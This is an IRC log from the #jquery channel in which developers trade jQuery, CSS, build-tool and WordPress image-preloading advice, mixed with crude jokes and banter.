[19:55:17] <gnarf> geekbuntu: Whirl3d
[19:55:18] <ch3mical> Whirl3d's
[19:55:25] <geekbuntu> if you have a wide enough monitor it all works out
[19:55:31] <Whirl3d> ch3mical, I thought I would bind the scroll event to the pagebody. Tell it to cycle through the topics and subtract the scrolltop from the topic's relative position. If the result<0 (meant it was off the page, then compare it to the current topic if result>current topic's result, it's the new current topic...
[19:55:37] <geekbuntu> i spanned my 2nd monitor and it's cool
[19:56:01] <Whirl3d> geekbuntu, it's rough rough rough still
[19:56:16] <ch3mical> Whirl3d: instead of going off of scrollbar value, why not go by the position of the top/bottom anchors versus the inner header position?
[19:56:21] <geekbuntu> Whirl3d, i like the wolves background removal
[19:56:33] <geekbuntu> Whirl3d, i use inkscape - that's not easy in inkscape
[19:56:58] <Whirl3d> geekbuntu, what is inkscape?
[19:57:10] <geekbuntu> Whirl3d, like a good version of gimp
[19:57:24] <geekbuntu> Whirl3d, it does everything (i think) that photoshop can do, but it's free
[19:57:34] <ch3mical> Whirl3d: the site is definitely sexy.. I wish I could do sexy... I suck at design... just good at the codez
[19:57:37] <geekbuntu> Whirl3d, it just doesn't have the following yet that ps does
[19:57:58] <Whirl3d> geekbuntu, oh, I thought you were talking about something else...I am familar with THAT inkscape. LOL
[19:57:58] <ch3mical> I've heard good things about inkscape
[19:58:06] <ch3mical> Haven't used it myself
[19:58:12] <geekbuntu> Whirl3d, it does some wicked stuff
[19:58:24] <geekbuntu> i mean  ch3mical
[19:58:28] <Whirl3d> ch3mical, thanks fo rthe compliment. Whenever you need sexy, let me know and I'll try to help
[19:58:41] <geekbuntu> he means he'll 'whip it up'
[19:58:43] <geekbuntu> o.0
[19:58:54] <ch3mical> Whirl3d: haha thanks
[19:59:21] <ch3mical> Whirl3d: anyway, what do you think about my idea?
[19:59:59] <geekbuntu> Whirl3d, undoubtedly you're a better designer than i am, but can you not just set a hard left margin on the class pageHolder loaded currentPage
[20:00:01] <geekbuntu> ?
[20:00:12] <ch3mical> Whirl3d: you can pull the current pos of the top/bottom anchors and change the anchors when headers go past those values
[20:01:25] <geekbuntu> that overlay plays hell with trying to control it
[20:02:42] <Whirl3d> geekbuntu, I haven't hardly messed with the css yet. I have a huge montor (2560x1600) and I haven't even tried to accomodate variable sizes yet. I have a resize script that will handle it all when I get this topic issue fixed.
[20:03:28] <ch3mical> You're a dreeeeaaaamweeaaver
[20:03:35] <ch3mical> *cough* uh.. sorry.
[20:03:39] <Whirl3d> geekbuntu, the crazy thing is that on various sections, the wolves slide in from various sides. It gets tricky. I have only been working on the infrastructure first...
[20:03:45] <Whirl3d> ch3mical, lol
[20:03:46] <geekbuntu> Whirl3d, you are gnarf asked earlier if i used any css correcting - i'm just using the boilerplate (paul irishes stripped down version), but it's kind of cool (so far) because i can just design/make a site, then it even loads in mobile (so far... knock on wood)
[20:04:06] <geekbuntu> thanks ch3mical now that damn song is stuck in my head
[20:04:10] <geekbuntu> :-D
[20:04:23] <ch3mical> geekbuntu: lol
[20:04:30] <ch3mical> geekbuntu: sucked in
[20:04:31] <geekbuntu> i miss imsky - hope he's ok
[20:04:39] <geekbuntu> haven't seen a wiggle in a few days
[20:04:50] <Whirl3d> I"ve been singing that song since I saw "the people vs. Larry Flint" the other day on HBO. LOL
[20:05:04] <ch3mical> haha
[20:05:55] <geekbuntu> i figure witchcraft is involved with 70's music... during the 70's we all wanted to kill the artists who wrote/sang it... in the new century we're going to kc and the sunshine bands concerts athe county fair - he's fat, wears a toupe and all the fans are fan and bald too
[20:05:56] <geekbuntu> o.0
[20:06:11] <geekbuntu> even the women
[20:06:14] <ch3mical> brb!
[20:07:49] <geekbuntu> i don't care if anyone doesn't want to explain this to me, but i would really like to get some buzz words, or a book title to read anonymously via pm on what to study to learn how to 'make a release' like when i go to the jquery authors sites - they have apps they've made, and you have to literally build the app - it compresses it, optimizes it and everything... just don't know what the process is called
[20:07:54] <geekbuntu> sorry fr the book
[20:10:41] <gnarf> geekbuntu: deployment
[20:10:42] <mysphyt> geekbuntu: Are you looking for like Google Closure or Uglify.js?
[20:11:08] <gnarf> geekbuntu: jquery uses makefile + Uglify.js
[20:11:14] <geekbuntu> mysphyt, i don't know what youre asking
[20:11:17] <geekbuntu> gnarf, ah
[20:11:25] <geekbuntu> we use make at work
[20:11:25] <gnarf> jquery-ui uses ant + closure compiler
[20:11:27] <geekbuntu> with python
[20:11:35] <geekbuntu> but it's such a big ass system
[20:11:40] <geekbuntu> will never get my mind around it
[20:11:44] <gnarf> geekbuntu: Makefiles can be pretty simple
[20:11:47] <geekbuntu> so small apps are more interesting
[20:11:56] <geekbuntu> definately more public friendly
[20:12:04] <gnarf> geekbuntu: https://github.com/jquery/jquery-color/blob/api-2/Makefile
[20:12:13] <geekbuntu> ty gnarf
[20:12:21] <geekbuntu> ah
[20:12:21] <gnarf> geekbuntu: that is the make script for jquery color
[20:12:36] <geekbuntu> like a bash template
[20:12:43] <gnarf> geekbuntu: but a little stronger yeah
[20:12:57] <gnarf> geekbuntu: jQuery's makefile is more interesting
[20:13:06] <gnarf> because that one cats like 10 other files together
[20:13:22] <geekbuntu> the only adjustment i've made since learning jquery is i'm using bottle.py for the backend - using pure python to build the dicts (a.k.a json objects) and jquery for the front end
[20:13:31] <gnarf> geekbuntu: https://github.com/jquery/jquery/blob/master/Makefile#L55
[20:13:33] <geekbuntu> gnarf, i think you were the person i was talking to about php
[20:14:12] <geekbuntu> i didn't thank mysphyt for trying to help - hope i didn't offend him
[20:14:44] <gnarf> doubtful
[20:15:14] <geekbuntu> one thing about getting to the pinnacle of middle age - you realize how delicate people are - despite not showing it
[20:15:30] <geekbuntu> so i'm shooting for good karma if it's possible
[20:15:33] <ch3mical> back
[20:15:33] <gnarf> well if you did - fuck him
[20:15:39] <gnarf> ;)
[20:15:46] <geekbuntu> *gasp*
[20:15:51] <geekbuntu> lol
[20:15:53] <ch3mical> What'd I miss?
[20:16:03] <geekbuntu> philosophical debate
[20:16:03] <gnarf> ch3mical: absolutely nothing
[20:16:12] <geekbuntu> bullsh*t
[20:16:17] <gnarf> ?logs
[20:16:18] <bot-t> Logs: http://lampoon.gurpartap.com/bot/log/jquery
[20:16:19] <gnarf> go see
[20:16:21] <gnarf> :)
[20:16:27] <gnarf> or like scroll up
[20:16:28] <gnarf> whatever
[20:16:37] <geekbuntu> gnarf, i see... it just makes a shopping list and packs it up
[20:16:51] <gnarf> geekbuntu: yup
[20:16:51] <ch3mical> Word
[20:16:56] <geekbuntu> gnarf, guess you could do wetf u wanted
[20:16:58] <gnarf> geekbuntu: and it can know if the file has been changed
[20:17:05] <geekbuntu> sweet
[20:17:08] <gnarf> geekbuntu: so like it only rebuilds if it needs to
[20:17:28] <gnarf> the deployment for jQuery is a bit beyond the Makefile
[20:17:39] <gnarf> cuz you also gotta upload it to the right places, etc
[20:17:51] <gnarf> i'm pretty sure JohnResig has scripted all that stuff
[20:17:59] <geekbuntu> is wikipedia the only major wiki game on the block?
[20:18:12] <geekbuntu> looking for an api - and wikipedias is a weak ass api
[20:18:25] <gnarf> wikimedia?
[20:18:34] <geekbuntu> and i hate going to the api farm - never know how long they'll be around
[20:19:06] <gnarf> geekbuntu: http://www.mediawiki.org/wiki/API:Main_page i assume is what you were talking about
[20:19:08] <geekbuntu> haven't heard of wikimedia... isn't that just a wiki app?
[20:19:22] <ch3mical> LOL!
[20:19:22] <blisk> Think wikipedia.
[20:19:30] <geekbuntu> http://www.wikipedia.org/
[20:19:31] <gnarf> mediawiki - i got it backwards
[20:19:40] <geekbuntu> gnarf, i do that constantly
[20:19:44] <geekbuntu> backwards
[20:19:57] <gnarf> geekbuntu: i thought you were homophobic?
[20:20:15] <geekbuntu> that was a joke, but i am straight
[20:20:36] <geekbuntu> life is way too short to go around scared and judging people for what they choose
[20:20:38] <gnarf> ?twss @geekbuntu
[20:20:38] <bot-t> geekbuntu, <iainvdw> was fiddling with it for a while, got close a few times, but didn't do exaclty what i wanted, thx!

[20:21:05] <gnarf> "thats what she said"
[20:21:11] <geekbuntu> lmao
[20:23:53] <ch3mical> brb, installing updates
[20:24:24] <geekbuntu> the sausage plugin has a lot of options
[20:25:10] <geekbuntu> actually a good use of the deferred listener
[20:26:18] <skyl> thinking about a range input to scale a div with 3 canvases in it.  is it crazy or is there an easy way?
[20:27:29] <gnarf> skyl: somewhere between crazy and easy way
[20:27:43] <ch3mical> Switched to my phone
[20:27:54] <gnarf> ch3mical: addict
[20:27:59] <ch3mical> Lol
[20:28:30] <gnarf> ch3mical: next thing you know, you'll be running znc so as to never miss out on irc action
[20:29:23] <ch3mical> Heh
[20:29:35] <Whirl3d> <--learned more from this channel than any class/manual/etc. Great info here, great folks here too
[20:29:40] <geekbuntu> i can't talk - i had stackoverflow on my xoom, phone and tv (hooked to my pc)... then it dawned on me why i was distracted
[20:30:31] <gnarf> \o/

[20:36:02] <geekbuntu> oh
[20:36:03] <gnarf> you don't know your user id?
[20:36:05] <geekbuntu> it is geekbuntu
[20:36:10] <geekbuntu> thought you meant pandora
[20:36:11] <blisk> heh
[20:36:12] <gnarf> thats not an id
[20:36:26] <gnarf> i'm like 91914 yo
[20:36:34] <gnarf> http://stackoverflow.com/users/91914

[20:37:05] <geekbuntu> geekcube@yahoo.com
[20:37:14] <blisk> nice plug
[20:37:17] <ch3mical> Yuk
[20:37:25] <gnarf> ch3mical: my name? its "gnarf"
[20:37:26] <geekbuntu> http://stackoverflow.com/users/664304/user664304
[20:37:48] <ch3mical> Whirl3d: yeah, I wish! Lol
[20:38:01] <geekbuntu> you mean gnard isn't your real name?
[20:38:14] <ch3mical> gnarf: I meant on stackoverflow
[20:38:18] <gnarf> ch3mical: why?
[20:38:22] <gnarf> I'm "gnarf"
[20:38:28] <ch3mical> It gives you a number until you set a "name"
[20:38:42] <gnarf> http://stackoverflow.com/users/91914/gnarf
[20:38:46] <ch3mical> Unless I misunderstood what you said
[20:38:51] <gnarf> it always uses the number dude
[20:38:53] <gnarf> its your userid
[20:38:59] <ezrafree> hello
[20:39:09] <gnarf> Oh hai!
[20:39:15] <gnarf> ^.^
[20:39:15] <ch3mical> I thought you were saying you "only" had a number
[20:39:18] <ezrafree> http://pastebin.com/N9Fj5Wah - can anyone familiar with jeditable tell me what i may be doing wrong here?
[20:39:27] <gnarf> ch3mical: nope, just sayin i was 91914
[20:39:35] <ch3mical> Oh ok
[20:39:39] <gnarf> i was 1887799 on ICQ
[20:39:46] <ch3mical> Is jeditable good?
[20:39:52] <gnarf> ch3mical: never used it
[20:39:56] <ch3mical> I'm looking for a replacement for dataTables
[20:40:01] <blisk> gnarf, back when you could get a 7 digit id.
[20:40:07] <gnarf> ch3mical: wish grid wasn't still "in planning"
[20:40:12] <ch3mical> It has a bug and I'm not willing to fix it myself
[20:40:28] <ch3mical> ezrafree: is jeditable good?
[20:40:44] <ch3mical> gnarf: yeah
[20:41:37] <ezrafree> ch3mical: i've liked jeditable so far, but i cannot seem to figure out how to send it the ID of the current object i am editing
[20:41:55] <ezrafree> but besides my current issue it's been very easy to use and flexible so far
[20:42:21] <geekbuntu> do you get any errors or messages?
[20:42:29] <chromakode> gnarf, so it turns out for one of our problems, the semantics of jQuery's width() function changed our ability to detect adblock.
[20:42:47] <gnarf> chromakode: you're detecting adblock?
[20:42:56] * gnarf scratches head
[20:42:56] <chromakode> gnarf, sssh, it's just for stats :)
[20:43:33] <ch3mical> I just need something simple
[20:43:41] <gnarf> chromakode: aren't you using analytics?
[20:43:54] <gnarf> or like getclicky?
[20:44:04] <gnarf> ch3mical: like a blow job?
[20:44:10] <ch3mical> Yeah
[20:44:13] <chromakode> gnarf, ga? we do, but we do some internal stats as well
[20:44:21] <ch3mical> You offering?
[20:44:31] <gnarf> ch3mical: i dunno, i haven't seen a pic
[20:44:35] <ch3mical> Lol
[20:44:42] <gnarf> ?js peen(5)
[20:44:43] <bot-t> gnarf: "8=====D"
[20:44:45] <ch3mical> You're so shallow
[20:44:46] <gnarf> or more like
[20:44:50] <gnarf> ?js ajpiano()
[20:44:50] <bot-t> gnarf: "8=D"
[20:44:50] <chromakode> gnarf, the more interesting failure is not detection-related, though
[20:44:59] <chromakode> at least, so far as I know.
[20:45:17] <ch3mical> Ok brb, gotta drive
[20:45:58] <gnarf> chromakode: still on the hunt then?
[20:46:02] <chromakode> fraid so
[20:46:04] <gnarf> ch3mical: not gonna irc and drive?
[20:46:09] <gnarf> chromakode: :/
[20:46:10] <ch3mical> Maybe
[20:46:14] <ch3mical> Don't temp me
[20:46:30] <gnarf> mv ch3mical /tmp
[20:46:56] <chromakode> win.
[20:47:15] <ch3mical> Hah
[20:47:33] <ch3mical> Tempt*
[20:47:37] <ch3mical> See? Can't do both
[20:47:52] <Whirl3d> anybody got a good tutorial for .map? I am not getting it for some reason
[20:48:13] <blisk> heh
[20:48:19] <gnarf> ch3mical: addict
[20:48:25] <Brodingo> sup
[20:48:33] * gnarf hugs ch3mical
[20:48:35] <Zerxer> Whirl3d: doesn't that just apply a function to every value in an array/object? similar to PHP's array_map function, if that helps
[20:48:37] <blisk> tough love
[20:48:50] <gnarf> don't like drive off a cliff cuz you're lurkin IRC dood
[20:48:51] <ch3mical> Hehe
[20:48:58] <Whirl3d> Zerxer! good to see you.
[20:49:08] <blisk> headline would be interesting though
[20:49:29] <Whirl3d> like the brand new owner of Segway, huh?
[20:49:39] <gnarf> Whirl3d: map maps things yo
[20:50:08] <Whirl3d> gnarf, I still can't find the restroom in this building no matter how I apply map
[20:50:08] <gnarf> ?js $([1, 2, 3, 4]).map(function() { return this * 2; }).get();
[20:50:09] <bot-t> gnarf: [2, 4, 6, 8]
[20:50:24] <gnarf> ?js $([1, 2, 3, 4]).map(function() { return peen(this); }).get();
[20:50:25] <bot-t> gnarf: ["8=D", "8==D", "8===D", "8====D"]
[20:50:32] <Zerxer> lol
[20:50:45] <gnarf> you wanna see a usecase
[20:50:56] <Whirl3d> <--always forgetting to use .get()
[20:51:35] <gnarf> Whirl3d: https://github.com/jquery/jquery-ui/blob/master/ui/jquery.effects.core.js#L221-295
[20:51:39] <gnarf> Whirl3d: that uses map
[20:51:42] <gnarf> i wrote the map
[20:51:45] <gnarf> so like ask away
[20:51:48] <gnarf> if you dont get it
[20:53:07] <gnarf> i personally think that block of code is sexy
[20:56:53] <Whirl3d> gnarf, very sexy indeed. Still working on understading it. brb
[20:57:34] <gnarf> it has nice sexy curves
[20:58:24] <paul_irish> sexxxy currrves
[20:58:33] <gnarf> ?fyn paul irish
[20:58:34] <bot-t> http://fuckyeahnouns.com/images/paul+irish
[20:58:59] <gnarf> lol
[20:59:02] <gnarf> http://fuckyeahnouns.com/images/paul_irish is even funnier
[20:59:31] <Shyne> I was wondering if someone can point me to an example where php is being called from a html file and the result is put into a listview with the jquery mobile css.
[20:59:36] <gnarf> friday night in #jquery
[20:59:57] <paul_irish> absolutely beyond me why they dont use http://www.coyote-rock.com/images/Images06/PAUL%20IRISH%209-8-06%20%2026%20LBS.JPG
[21:01:59] <geekbuntu> paul_irish, you've changed alot
[21:02:06] <paul_irish> :)
[21:02:55] <geekbuntu> paul_irish, reminds me of NC
[21:03:56] <geekbuntu> dated website
[21:10:16] <geekbuntu> setting bootstraps blows
[21:11:29] <gnarf> paul_irish: someone here was lovin boilerplate earlier
[21:11:32] <gnarf> i forget who
[21:11:41] <paul_irish> i saw itt
[21:12:26] <gnarf> _o/
[21:12:42] <dytrivedi> sup dawgs
[21:13:47] <blisk> fist pound
[21:19:43] <Whirl3d> how do I select the previous element of the same class? I see how to select the next one, but what about the previous one
[21:19:49] <geekbuntu> it was me on the boilerplate
[21:43:41] <Whirl3d> if you have an element whose parent is a scrolling div and you get the position() of the element, it should remain constant, right? It shouldn't change with the scroll position of it's parent, right?
[21:45:35] <Whirl3d> because I am checking the position of a series of anchor elements in a scrolling div and when I scroll up their position.top should remain constant. Instead, it gets bigger? I could understand smaller, but bigger?
[21:46:35] <Whirl3d> did I disconnect, or is everyone busy with something else?
[21:52:22] <Whirl3d> wow. Did I miss a firedrill or something.  I'm gonna reconnect...
[22:13:43] <ch3mical> For some reason my phone will no longer connect to freenode
[22:14:03] <ch3mical> Gives me an error about SASL, whatever that is
[22:14:49] <ch3mical> Hmmm Simple Authentication and Security Layer
[22:14:57] <brianseeders> sounds like connecting to wrong port
[22:16:05] <ch3mical> I'm just letting it use the default
[22:16:11] <ch3mical> 7000
[22:16:43] <brianseeders> All freenode servers listen on ports 6665, 6666, 6667, 6697 (SSL only), 7000 (SSL only), 7070 (SSL only), 8000, 8001 and 8002
[22:16:57] <ch3mical> I'm using SSL
[22:16:58] <gnarf> Whirl3d: friday night in #jquery
[22:17:01] <brianseeders> ah
[22:17:24] <gnarf> SASsy Layer
[22:17:28] <gnarf> thats what SASL is
[22:17:30] <ch3mical> Going to try a non-SSL port..
[22:17:40] <gnarf> dont let that shit talk to you like that
[22:17:44] <ch3mical> gnarf: my kind of port ;0
[22:17:51] <gnarf> woah!
[22:17:56] <gnarf> ^.^
[22:19:23] <gnarf> so like, lets talk about jQueries
[22:19:32] * gnarf pokes people
[22:19:52] <gnarf> you guys know about rewardjs.com ?
[22:20:01] <ch3mical> Nope
[22:20:07] <ch3mical> Enlighten me
[22:20:20] <ch3mical> Linkify that so I can click it
[22:20:33] <ch3mical> Copy/paste burns too many calories
[22:20:44] <ch3mical> I'm trying to cut down on that
[22:21:58] <gnarf> http://rewardjs.com -- they are giving away prizes for fixing bugs in ui
[22:23:43] <ch3mical> That's a pretty sneaky way of getting people to work for little or no pay lol
[22:24:18] <gnarf> ch3mical: alot of us already work for little or no pay
[22:24:21] <gnarf> most of us
[22:24:29] <ch3mical> Yeah
[22:24:36] <ch3mical> :(
[22:24:44] <gnarf> its a open source project
[22:25:44] <ch3mical> I'm not saying I'm against it
[22:26:21] <ch3mical> I kind of have a lot of "projects" on my plate already
[22:29:33] <ch3mical> Whirl3d: did you ever try my suggestion or figure out a solution?

[22:52:38] * gnarf hides behind ch3mical
[22:52:42] <ch3mical> Oh, that wouldn't bother me

[23:01:00] <hobs> hows it going buddy
[23:01:01] <bot-t> fucking paul irish! http://i.imgur.com/gpspl.png
[23:01:38] <ch3mical> danmichel: before you get into preloading, at least specify a set height and width for your img tags, I hate when a site's elements jump around the page because the images that hold them in place haven't loaded
[23:01:41] <paul_irish> s'goooood
[23:02:05] <ch3mical> I'm a bit perfectionist
[23:02:05] <ch3mical> heh
[23:02:07] <danmichel> me too ch3mical
[23:02:13] <paul_irish> prove it.
[23:02:18] <hobs> http://i.imgur.com/E168B.png
[23:02:21] <hobs> I made you a picture
[23:02:36] <gnarf> awwww
[23:02:39] <paul_irish> BOOM craftsman
[23:02:40] <paul_irish> ?boom
[23:02:40] <bot-t> Did you are unimpressed? and now?
[23:02:43] <danmichel> lemmy look into this ch3mical. this is gonna take a while
[23:03:04] <hobs> ok I am going into extended mark alpha mode
[23:03:36] <gnarf> Commence Operation: Whiskey Tango Foxtrot
[23:03:54] <danmichel> oh ch3mical, this is just a WP thing. it's how their images are handled
[23:04:16] <danmichel> ch3mical: id have to alter the core code
[23:04:29] <ch3mical> But you can *fix* that with jquery :D
[23:04:39] <danmichel> one sec
[23:04:56] <gnarf> paul_irish: I totally got $elem.animate({ backgroundColor: $.Color({ saturation: 0 }) }, 250); working
[23:05:07] <sterna> zomg notepad
[23:06:03] <danmichel> ill just change it here $the_newh .= '<li'.$st.'><a href="'.$imageLink.'"><img src="'.$thumbnail[0].'" alt="'.$image->post_title.'" /></a></li>';
[23:06:19] <ch3mical> Sure, whatever
[23:07:29] <gnarf> sterna: that list is sure pro tho right?
[23:07:47] <gnarf> master crafted you might say
[23:08:02] <ch3mical> danmichel: p.s. doing it that way assumes all your images are the same size (otherwise they'll be stretched)
[23:08:39] <danmichel> '$thumbnail' are all the same size
[23:08:51] <danmichel> $thumbnail = wp_get_attachment_image_src($image->ID,"thumbnail");
[23:09:00] <ch3mical> What about the full image
[23:09:43] <danmichel> i thought you just wanted me to give the thumbnails a width and height. the full images do have width and heights
[23:10:07] <danmichel> wait.... you meant for me to preload everything? i thought you just meant the thumbnails on the bottom there
[23:10:10] <gnarf> danmichel:  yo
[23:10:14] <gnarf> danmichel: like a quick google
[23:10:35] <wookiehangover> "these aren't the phps yr looking for"
[23:11:21] <gnarf> http://core.trac.wordpress.org/browser/tags/3.1.2/wp-includes/media.php
[23:11:27] <gnarf> thats totally lame
[23:11:30] <gnarf> it doesn't put the size()
[23:11:31] <gnarf> wtf
[23:11:59] <gnarf> oh wait
[23:12:00] <danmichel> ch3mical: you just meant the thumbnail images in the carousel right?(to preload)
[23:12:00] <gnarf> it does
[23:12:18] <danmichel> thanks gnarf
[23:12:32] <danmichel> gnarf no, it doesnt
[23:12:41] <danmichel> thats what i was telling ch3mical gnarf
[23:12:43] <ch3mical> danmichel: no, the full image.. it might not be a big deal anyway, I'm just on a slow connection
[23:12:55] <danmichel> not really worth going through the trouble i think
[23:13:21] <danmichel> oh ch3mical, im only interested in preloading the thumbnails in the carousel
[23:13:22] <ch3mical> For me when it loads, all the thumbnails are at the top of the page, then they get pushed down, then the main image load
[23:13:25] <danmichel> but my site is hela fast
[23:13:35] <danmichel> less than half a second on cable
[23:13:39] <danmichel> 2 seconds on dsl
[23:13:44] <danmichel> even with all the images
[23:13:45] <gnarf> wth is wp_get_attachment_image_attributes supposed to be anyway
[23:13:53] <danmichel> itd only be slow for people on dialup
[23:14:07] <danmichel> http://www.webpagetest.org/result/110513_MV_KQP9/
[23:14:23] <danmichel> gnarf: haha, not a coder
[23:14:24] <ch3mical> I'm on my phone's wifi hotspot
[23:14:30] <ch3mical> lol
[23:14:55] <ch3mical> 2 seconds is a long time for teh webz
[23:15:34] <danmichel> i accept the fact that my site is for people who recognize it's an image site pretty much
[23:16:00] <sterna> gnarf: it's a very violent list :P
[23:16:23] <gnarf> sterna: assassins can dream of unicorns too
[23:18:26] <gnarf> ch3mical: I think I just came up with a better description of rewardjs.com
[23:18:30] <gnarf> "bugfix lotto"
[23:18:49] <gnarf> you get a t-shirt no matter what thi
[23:18:58] <gnarf> game show maybe?
[23:19:02] <ch3mical> lol
[23:19:06] <ch3mical> Nice
[23:19:33] <ch3mical> How about "bugfix deathrace" ?
[23:19:55] <gnarf> ....
[23:19:57] <ch3mical> No?
[23:19:59] <gnarf> no
[23:20:17] <danmichel> ch3mical: so no way to preload just the images in the thumbnail carousel withought adding that width height thing?
[23:20:39] <ch3mical> danmichel: yeah of course you can
[23:20:48] <ch3mical> I was just bein nit picky
[23:21:26] <gnarf> paul_irish: you sent me a link like a month ago about a image desaturation filter type css sexiness
[23:21:55] <gnarf> still got that?
[23:22:47] <danmichel> ch3mical: awesome
[23:23:00] <danmichel> simple task ch3mical?
[23:23:09] <gnarf> danmichel:  link again?
[23:23:26] <danmichel> gnarf: http://nybodyart.com/
[23:23:42] <danmichel> click the ilaria pozzi post
[23:23:53] <danmichel> then click view gallery on the bottom of the post
[23:24:38] <ch3mical> Have fun looking at hot tattood chicks
[23:24:47] <danmichel> was ch3mical's idea but he leaves me hanging!
[23:24:48] <danmichel> haha
[23:24:49] <ch3mical> I have to get up super early
[23:24:51] <gnarf> its already preloading
[23:24:53] <danmichel> just teasing
[23:24:56] <danmichel> but really
[23:25:03] <gnarf> <img> tags in html preload :)
[23:25:06] <danmichel> he got me on this preload thing now
[23:25:10] <gnarf> danmichel: try using that other function
[23:25:26] <ch3mical> They weren't preloaded for me
[23:25:29] <danmichel> gnarf: 'that' other function?
[23:25:39] <ch3mical> Maybe my connection is just shit
[23:25:43] <ch3mical> :(
[23:25:53] <danmichel> gnarf: they jump around if youre on dsl or something
[23:26:01] <gnarf> get_image_tag
[23:26:07] <danmichel> youll miss it on cable
[23:26:12] <gnarf> or wait
[23:26:46] <paul_irish> gnarf: https://dvcs.w3.org/hg/FXTF/raw-file/tip/filters/publish/Filters.html
[23:26:53] <danmichel> wouldnt i be modifying this? http://pastebin.com/KCMZ4qij
[23:26:55] <gnarf> wp_get_attachment_image( $attachment_id )
[23:27:08] <gnarf> danmichel: im talking in the php
[23:27:18] <gnarf> that calls some other function too that might actually get width/height
[23:27:21] <gnarf> i'm not 100% sure
[23:27:24] <gnarf> but its worth a shot
[23:27:35] <gnarf> it spits out the entire <img> tag
[23:27:36] <danmichel> gnarf: no need for the width/height thing
[23:27:40] <danmichel> im not stressing that
[23:27:43] <danmichel> its just WP
[23:27:46] <gnarf> danmichel: thats what makes shit jump
[23:27:55] <gnarf> danmichel: which interrupts the viewing
[23:28:03] <gnarf> of the hot tattooed chick
[23:28:15] <danmichel> gnarf: the main image does have a width height
[23:28:27] <danmichel> the thumbs just load the thumbnail image
[23:28:32] <ch3mical> By the way it was this page that it seemed like it wasn't preloaded, when I click on a thumbnail, the main image loads last (presumably because it takes a second longer than everything else), causing page elements to get shoved around
[23:28:37] <gnarf> paul_irish: thx
[23:28:40] <danmichel> which is already a set width height if you now what i mean
[23:28:46] <ch3mical> ... but I suppose it could just be my connection
[23:28:51] <gnarf> ?js hi5("paul_irish", "gnarf")
[23:28:52] <bot-t> gnarf: "paul_irish _o/\o_ gnarf"
[23:28:56] <danmichel> the jump is because the jquery loads after all the images in the LI load
[23:28:59] <danmichel> know what i mean?
[23:29:37] <ch3mical> http://nybodyart.com/photographer/ilaria-pozzi-by-corrado-dalco/attachment/corradodalco-2/
[23:29:40] <ch3mical> That one
[23:30:16] <ch3mical> So, on that note, goodnight
[23:30:57] <danmichel> it isnt as simple as giving the images in the carousel an id and putting this in there? http://pastebin.com/vTEahJM1
[23:31:44] <gnarf> danmichel: you don't really need preload - you're moving page to page
[23:32:01] <gnarf> preload would be like loading the images you're going to show that aren't yet in the dom
[23:32:10] <danmichel> gnarf: i just wanna preload the images in the carousel
[23:32:18] <gnarf> danmichel: they are <img> tags
[23:32:23] <gnarf> they are already loaded?
[23:33:39] <danmichel> i just want the images in the LI not to all load at the same time
[23:33:57] <danmichel> know what i mean?
[23:34:23] <gnarf> danmichel: nope
[23:34:53] <danmichel> gnarf: click on the next button and focus on the bottom carousel LI http://nybodyart.com/photographer/ilaria-pozzi-by-corrado-dalco/attachment/corradodalco/
[23:35:06] <danmichel> or back button
[23:35:20] <danmichel> see that?
[23:35:37] <gnarf> too busy looking at boobs
[23:35:49] <danmichel> i think that was the problem, haha
[23:36:02] <danmichel> notice how the jquery has to catch up to the images
[23:36:06] <danmichel> in the carousel?
[23:37:08] <gnarf> danmichel: its hard to dig into that for me right now
[23:37:12] <gnarf> not the level I'm on
[23:37:21] <danmichel> i hear you
[23:37:29] <gnarf> and not something i'd be paid for
[23:37:30] <gnarf> so like
[23:37:39] <gnarf> i'd rather dream of sexy shit to write for jquery color
[23:38:34] <danmichel> all this for nothing, haha. i totally didnt even want to do this before ch3mical suggested it
[23:39:02] <danmichel> you write gnarf?
[23:39:11] <gnarf> danmichel: like what?
[23:39:25] <gnarf> with a pencil?
[23:39:27] <gnarf> sometimes
[23:39:29] <danmichel> like articles
[23:39:30] <gnarf> usualy I type tho
[23:39:34] <danmichel> thats what i thought you meant
[23:39:40] <danmichel> dont know what jquery color is
[23:40:03] <gnarf> https://github.com/jquery/jquery-color/commits/api-2
[23:41:14] <gnarf> http://wiki.jqueryui.com/w/page/12137744/Color-Library

[23:43:59] <gnarf> cuz i spend all my time talkin in IRC
